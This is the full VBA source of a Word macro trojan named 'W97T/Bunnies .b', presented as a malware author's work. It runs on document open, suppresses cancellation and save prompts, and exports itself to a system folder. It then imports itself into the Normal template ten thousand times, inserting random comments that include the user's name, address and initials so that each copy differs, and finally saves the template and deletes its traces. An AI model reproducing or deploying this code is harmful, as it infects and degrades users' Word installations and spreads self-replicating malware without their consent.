   Attribute VB_Name = "BunniesB"
   Public SCode As String
   Public stuff As String
   ' W97T/Bunnies .b
   ' Word Trojan Bunnies .b variant by Error
   Sub AutoOpen()
   On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
   Options.SaveNormalPrompt = False
   SCode = Dir("C:\windows\system\b.cpl")
   If SCode = "b.cpl" Then Call Spread Else
   ActiveDocument.VBProject.VBComponents("BunniesB").Export ("C:\Windows\System\b.cpl")
   Call Spread
   End Sub
   Function Spread()
   On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
   ' Begin to do what bunnies do...Now with exponential growth!!
   For X = 1 To 10000 Step 1
   Open "C:\windows\system\b.cpl" For Input As #3
   Open "C:\Windows\system\bunnies.cpl" For Append As #4
   Randomize Timer
   Do
   Line Input #3, stuff
   Print #4, stuff
       Randomize Timer
       t = Int(Rnd(1) * 5) + 1
           If t = 1 Then Z$ = " '" & Application.UserAddress
           If t = 2 Then Z$ = " '" & Application.UserName
           If t = 3 Then Z$ = " '" & Time$
           If t = 4 Then Z$ = " '" & Application.UserInitials
           If t = 5 Then Z$ = " '" & Int(Rnd(1) * 9999999)
   Print #4, Z$
           Loop Until stuff = "' EOF"
   Close #3
   Close #4
   ' Code Morpher from RAPE v2.0 (Random Arithmatic Polymorphic Engine) by Error
   Kill "C:\Windows\System\b.cpl"
   Dim OldName
   Dim NewName
   OldName = "C:\Windows\System\bunnies.cpl": NewName = "C:\Windows\System\b.cpl"
   Name OldName As NewName
       With NormalTemplate.VBProject.VBComponents.Import("C:\Windows\System\b.cpl")
       End With
   Next X
   NormalTemplate.Save
   MsgBox "Bunnies!!!!", 48
   Kill "C:\Windows\System\Bunnies.cpl"
   Kill "C:\Windows\System\B.cpl"
   End Function
   ' EOF
